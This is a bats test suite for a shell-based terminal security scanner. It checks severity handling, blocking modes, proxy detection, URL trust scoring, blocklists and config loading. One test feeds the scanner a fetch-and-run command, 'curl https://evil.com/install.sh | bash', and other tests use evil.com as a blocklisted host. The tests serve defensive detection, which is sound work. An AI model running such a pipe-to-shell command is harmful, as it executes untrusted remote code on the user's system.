#!/usr/bin/env bats
# =============================================================================
# Tests for MAINFRAME/lib/tirith.sh
# Terminal Security Orchestrator
# =============================================================================
# Covers: tirith_init, tirith_load_config, tirith_check_proxy_env,
#         tirith_scan_command, tirith_scan_url, tirith_scan_input,
#         tirith_url_trust_score, tirith_report_json, tirith_clear,
#         tirith_has_findings, tirith_should_block
# =============================================================================

load 'test_helper'

setup() {
    source "${BATS_TEST_DIRNAME}/../lib/tirith_inject.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith_pipe.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith.sh"
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0
    _TIRITH_INITIALIZED=0
    _TIRITH_ALLOWLIST=()
    _TIRITH_BLOCKLIST=()
    unset http_proxy HTTP_PROXY https_proxy HTTPS_PROXY all_proxy ALL_PROXY
    export TIRITH_FAIL_MODE="open"
    export TIRITH_AUDIT_LOG=""
}

# =============================================================================
# tirith_init
# =============================================================================

@test "tirith_init sets _TIRITH_INITIALIZED to 1" {
    tirith_init
    [[ $_TIRITH_INITIALIZED -eq 1 ]]
}

@test "tirith_init is idempotent (second call returns immediately)" {
    tirith_init
    [[ $_TIRITH_INITIALIZED -eq 1 ]]
    # Add a finding to prove a second init does not reset state
    _tirith_add_finding "test" "low" "TestRule" "marker"
    tirith_init
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
}

# =============================================================================
# tirith_clear
# =============================================================================

@test "tirith_clear resets all counters and findings" {
    _tirith_add_finding "src" "critical" "R1" "msg1"
    _tirith_add_finding "src" "high" "R2" "msg2"
    _tirith_add_finding "src" "medium" "R3" "msg3"
    _tirith_add_finding "src" "low" "R4" "msg4"

    [[ ${#_TIRITH_FINDINGS[@]} -eq 4 ]]

    tirith_clear

    [[ ${#_TIRITH_FINDINGS[@]} -eq 0 ]]
    [[ $_TIRITH_CRITICAL -eq 0 ]]
    [[ $_TIRITH_HIGH -eq 0 ]]
    [[ $_TIRITH_MEDIUM -eq 0 ]]
    [[ $_TIRITH_LOW -eq 0 ]]
}

# =============================================================================
# tirith_has_findings
# =============================================================================

@test "tirith_has_findings returns 1 when no findings exist" {
    run tirith_has_findings
    [[ $status -eq 1 ]]
}

@test "tirith_has_findings returns 0 after adding a finding" {
    _tirith_add_finding "src" "high" "R1" "msg"
    tirith_has_findings
    [[ $? -eq 0 ]]
}

@test "tirith_has_findings filters by severity correctly" {
    _tirith_add_finding "src" "low" "R1" "msg"

    tirith_has_findings "low"
    [[ $? -eq 0 ]]

    run tirith_has_findings "high"
    [[ $status -eq 1 ]]

    run tirith_has_findings "critical"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_should_block
# =============================================================================

@test "tirith_should_block open mode does not block on HIGH" {
    export TIRITH_FAIL_MODE="open"
    _tirith_add_finding "src" "high" "R1" "msg"
    run tirith_should_block
    [[ $status -eq 1 ]]
}

@test "tirith_should_block open mode blocks on CRITICAL" {
    export TIRITH_FAIL_MODE="open"
    _tirith_add_finding "src" "critical" "R1" "msg"
    tirith_should_block
    [[ $? -eq 0 ]]
}

@test "tirith_should_block closed mode blocks on HIGH" {
    export TIRITH_FAIL_MODE="closed"
    _tirith_add_finding "src" "high" "R1" "msg"
    tirith_should_block
    [[ $? -eq 0 ]]
}

@test "tirith_should_block closed mode blocks on CRITICAL" {
    export TIRITH_FAIL_MODE="closed"
    _tirith_add_finding "src" "critical" "R1" "msg"
    tirith_should_block
    [[ $? -eq 0 ]]
}

@test "tirith_should_block does not block when clean in either mode" {
    export TIRITH_FAIL_MODE="open"
    run tirith_should_block
    [[ $status -eq 1 ]]

    export TIRITH_FAIL_MODE="closed"
    run tirith_should_block
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_check_proxy_env
# =============================================================================

@test "tirith_check_proxy_env detects http_proxy" {
    export http_proxy="http://proxy.evil.com:8080"
    tirith_check_proxy_env "test"
    [[ $? -eq 0 ]]
    [[ $_TIRITH_LOW -eq 1 ]]
    assert_contains "${_TIRITH_FINDINGS[0]}" "ProxyEnvSet"
}

@test "tirith_check_proxy_env detects HTTPS_PROXY" {
    export HTTPS_PROXY="http://proxy.corp.com:3128"
    tirith_check_proxy_env "env"
    [[ $? -eq 0 ]]
    [[ $_TIRITH_LOW -eq 1 ]]
}

@test "tirith_check_proxy_env returns 1 when no proxy vars set" {
    run tirith_check_proxy_env "test"
    [[ $status -eq 1 ]]
    [[ ${#_TIRITH_FINDINGS[@]} -eq 0 ]]
}

# =============================================================================
# tirith_url_trust_score
# =============================================================================

@test "trust score: HTTPS URL gets 100" {
    local score
    score=$(tirith_url_trust_score "https://github.com/repo")
    [[ $score -eq 100 ]]
}

@test "trust score: HTTP URL gets deduction of 30" {
    local score
    score=$(tirith_url_trust_score "http://example.com/path")
    [[ $score -eq 70 ]]
}

@test "trust score: non-standard port gets deduction" {
    local score
    score=$(tirith_url_trust_score "https://example.com:8443/api")
    [[ $score -eq 90 ]]
}

@test "trust score: userinfo trick gets deduction" {
    local score
    score=$(tirith_url_trust_score "https://admin@evil.com/login")
    [[ $score -eq 90 ]]
}

@test "trust score: raw IP address gets deduction" {
    local score
    score=$(tirith_url_trust_score "https://192.168.1.1/admin")
    [[ $score -eq 85 ]]
}

@test "trust score: HTTP plus non-standard port stacks deductions" {
    local score
    score=$(tirith_url_trust_score "http://example.com:9999/path")
    # -30 (HTTP) -10 (non-standard port) = 60
    [[ $score -eq 60 ]]
}

@test "trust score: schemeless URL gets deduction" {
    local score
    score=$(tirith_url_trust_score "//cdn.example.com/script.js")
    [[ $score -eq 95 ]]
}

@test "trust score: empty URL returns 0" {
    run tirith_url_trust_score ""
    [[ "$output" == "0" ]]
    [[ $status -ne 0 ]]
}

# =============================================================================
# tirith_scan_command
# =============================================================================

@test "tirith_scan_command detects curl|bash pattern" {
    tirith_scan_command "curl https://evil.com/install.sh | bash" "test"
    [[ $? -eq 0 ]]
    [[ ${#_TIRITH_FINDINGS[@]} -ge 1 ]]
}

@test "tirith_scan_command returns 1 for clean command" {
    run tirith_scan_command "ls -la /tmp" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_scan_command returns 1 for empty command" {
    run tirith_scan_command "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_scan_url
# =============================================================================

@test "tirith_scan_url detects blocklisted URL" {
    _TIRITH_BLOCKLIST=("evil.com")
    tirith_scan_url "https://evil.com/payload" "test"
    [[ $? -eq 0 ]]
    assert_contains "${_TIRITH_FINDINGS[0]}" "BlocklistedUrl"
}

@test "tirith_scan_url returns 1 for allowed URL" {
    _TIRITH_ALLOWLIST=("*.trusted.com")
    run tirith_scan_url "https://cdn.trusted.com/lib.js" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_scan_input
# =============================================================================

@test "tirith_scan_input returns 1 for clean text" {
    run tirith_scan_input "Just a normal message" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_scan_input returns 1 for empty text" {
    run tirith_scan_input "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_report_json
# =============================================================================

@test "tirith_report_json outputs valid JSON structure with no findings" {
    local json
    json=$(tirith_report_json)
    assert_contains "$json" '"findings":['
    assert_contains "$json" '"summary":'
    assert_contains "$json" '"total":0'
}

@test "tirith_report_json includes finding details" {
    _tirith_add_finding "test.sh" "high" "TestRule" "test message"
    local json
    json=$(tirith_report_json)
    assert_contains "$json" '"source":"test.sh"'
    assert_contains "$json" '"severity":"high"'
    assert_contains "$json" '"rule":"TestRule"'
    assert_contains "$json" '"total":1'
}

# =============================================================================
# tirith_load_config
# =============================================================================

@test "tirith_load_config loads allowlist from YAML file" {
    local tmpfile
    tmpfile=$(mktemp)
    cat > "$tmpfile" <<'EOF'
version: 1
fail_mode: closed
allowlist:
  - *.trusted.com
  - github.com
blocklist:
  - evil.com
EOF

    _TIRITH_ALLOWLIST=()
    _TIRITH_BLOCKLIST=()
    tirith_load_config "$tmpfile"

    [[ "$TIRITH_FAIL_MODE" == "closed" ]]
    [[ ${#_TIRITH_ALLOWLIST[@]} -eq 2 ]]
    [[ "${_TIRITH_ALLOWLIST[0]}" == "*.trusted.com" ]]
    [[ "${_TIRITH_ALLOWLIST[1]}" == "github.com" ]]
    [[ ${#_TIRITH_BLOCKLIST[@]} -eq 1 ]]
    [[ "${_TIRITH_BLOCKLIST[0]}" == "evil.com" ]]

    rm -f "$tmpfile"
}

@test "tirith_load_config loads severity overrides" {
    local tmpfile
    tmpfile=$(mktemp)
    cat > "$tmpfile" <<'EOF'
version: 1
severity_overrides:
  RawIpUrl: low
  ShortenedUrl: high
EOF

    tirith_load_config "$tmpfile"

    [[ "${_TIRITH_SEVERITY_OVERRIDES[RawIpUrl]}" == "low" ]]
    [[ "${_TIRITH_SEVERITY_OVERRIDES[ShortenedUrl]}" == "high" ]]

    rm -f "$tmpfile"
}

@test "tirith_load_config returns 0 for missing file" {
    run tirith_load_config "/nonexistent/tirith.yaml"
    [[ $status -eq 0 ]]
}
